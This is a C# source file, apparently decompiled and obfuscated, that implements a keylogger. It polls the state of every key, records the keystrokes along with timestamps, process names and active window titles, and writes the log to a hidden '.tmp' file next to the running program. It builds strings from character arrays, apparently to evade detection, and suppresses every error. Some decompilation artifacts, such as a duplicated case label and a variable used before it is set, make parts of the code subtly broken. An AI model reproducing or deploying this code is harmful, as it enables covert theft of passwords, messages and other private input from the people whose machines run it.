namespace w
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    public class GClass1
    {
        public object object_0 = (Assembly.GetExecutingAssembly().Location + new string(new char[] { '.', 't', 'm', 'p' }));
        private object object_1 = new Keyboard();
        public object object_2 = "";
        public object object_3 = new Clock();
        private object object_4 = 0;
        private object object_5;
        private object object_6;

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern short GetAsyncKeyState(int int_0);
        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int GetKeyboardLayout(int int_0);
        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] byte_0);
        [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);
        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uint_0, uint uint_1);
        private string method_0()
        {
            string str;
            try
            {
                int num;
                IntPtr foregroundWindow = GetForegroundWindow();
                GetWindowThreadProcessId(foregroundWindow, ref num);
                object processById = Process.GetProcessById(num);
                if (Conversions.ToBoolean(Operators.OrObject(Operators.AndObject(foregroundWindow.ToInt32() == this.object_6, Operators.CompareObjectEqual(this.object_5, NewLateBinding.LateGet(processById, null, "MainWindowTitle", new object[0], null, null, null), false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, null, "MainWindowTitle", new object[0], null, null, null), null, "Length", new object[0], null, null, null), 0, false))))
                {
                    goto Label_0139;
                }
                this.object_6 = foregroundWindow.ToInt32();
                this.object_5 = Conversions.ToString(NewLateBinding.LateGet(processById, null, "MainWindowTitle", new object[0], null, null, null));
                str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("\r\n\x0001" + this.method_1() + " ", NewLateBinding.LateGet(processById, null, "ProcessName", new object[0], null, null, null)), " "), this.object_5), '\x0001'), "\r\n"));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
                goto Label_0139;
            }
            return str;
        Label_0139:
            return "";
        }

        private string method_1()
        {
            string str;
            try
            {
                str = this.object_3.LocalTime.ToString(new string(new char[] { 'y', 'y', '/', 'M', 'M', '/', 'd', 'd' }));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                str = new string(new char[] { '?', '?', '/', '?', '?', '/', '?', '?' });
                ProjectData.ClearProjectError();
            }
            return str;
        }

        private string method_2(Keys keys_0)
        {
            string str;
            bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(this.object_1, null, "ShiftKeyDown", new object[0], null, null, null));
            if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(this.object_1, null, "CapsLock", new object[0], null, null, null), true, false))
            {
                if (flag)
                {
                    flag = false;
                }
                else
                {
                    flag = true;
                }
            }
            try
            {
                switch (keys_0)
                {
                    case Keys.F1:
                    case Keys.F2:
                    case Keys.F3:
                    case Keys.F4:
                    case Keys.F5:
                    case Keys.F6:
                    case Keys.F7:
                    case Keys.F8:
                    case Keys.F9:
                    case Keys.F10:
                    case Keys.F11:
                    case Keys.F12:
                    case Keys.End:
                    case Keys.Delete:
                    case Keys.Back:
                        break;

                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                    case Keys.Shift:
                    case Keys.ShiftKey:
                    case Keys.Control:
                    case Keys.ControlKey:
                    case Keys.RControlKey:
                    case Keys.LControlKey:
                    case Keys.Alt:
                        return "";

                    case Keys.Space:
                        return new string(new char[] { ' ' });

                    case Keys.Enter:
                    case Keys.Enter:
                        if (this.object_2.EndsWith(new string(new char[] { '[', 'E', 'N', 'T', 'E', 'R', ']' }) + "\r\n"))
                        {
                            return "";
                        }
                        return (new string(new char[] { '[', 'E', 'N', 'T', 'E', 'R', ']' }) + "\r\n");

                    case Keys.Tab:
                        return (new string(new char[] { '[', 'T', 'A', 'P', ']' }) + "\r\n");

                    default:
                        if (flag)
                        {
                            return smethod_0((uint) keys_0).ToUpper();
                        }
                        return smethod_0((uint) keys_0);
                }
                str = "[" + keys_0.ToString() + "]";
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                if (flag)
                {
                    str = Strings.ChrW((int) keys_0).ToString().ToUpper();
                    ProjectData.ClearProjectError();
                    return str;
                }
                str = Strings.ChrW((int) keys_0).ToString().ToLower();
                ProjectData.ClearProjectError();
            }
            return str;
        }

        public void method_3()
        {
            try
            {
                this.object_2 = File.ReadAllText((string) this.object_0);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            try
            {
                int num2;
                Keys keys;
                int num = 0;
                goto Label_00E7;
            Label_0028:
                num2++;
                if (num2 <= 0xff)
                {
                    goto Label_007E;
                }
                goto Label_008D;
            Label_0036:
                keys = (Keys) num2;
                string str = this.method_2(keys);
                if (str.Length > 0)
                {
                    this.object_2 = ((string) this.object_2) + this.method_0();
                    this.object_2 = ((string) this.object_2) + str;
                }
                this.object_4 = keys;
                goto Label_0028;
            Label_007E:
                if (GetAsyncKeyState(num2) != -32767)
                {
                    goto Label_0028;
                }
                goto Label_0036;
            Label_008D:
                if (num == 0x3e8)
                {
                    num = 0;
                    int num3 = 0x5000;
                    if (this.object_2.Length > 0x5000)
                    {
                        this.object_2 = this.object_2.Remove(0, this.object_2.Length - num3);
                    }
                    File.WriteAllText((string) this.object_0, (string) this.object_2);
                }
                Thread.Sleep(1);
            Label_00E7:
                num++;
                num2 = 0;
                goto Label_007E;
            }
            catch (Exception exception3)
            {
                ProjectData.SetProjectError(exception3);
                ProjectData.ClearProjectError();
            }
        }

        private static string smethod_0(uint uint_0)
        {
            try
            {
                StringBuilder builder = new StringBuilder();
                byte[] buffer = new byte[0xff];
                if (!GetKeyboardState(buffer))
                {
                    return "";
                }
                uint num3 = MapVirtualKey(uint_0, 0);
                IntPtr foregroundWindow = GetForegroundWindow();
                int num2 = 0;
                IntPtr keyboardLayout = (IntPtr) GetKeyboardLayout(GetWindowThreadProcessId(foregroundWindow, ref num2));
                ToUnicodeEx(uint_0, num3, buffer, builder, 5, 0, keyboardLayout);
                return builder.ToString();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            return ((Keys) ((int) uint_0)).ToString();
        }

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_0, uint uint_2, IntPtr intptr_0);
    }
}

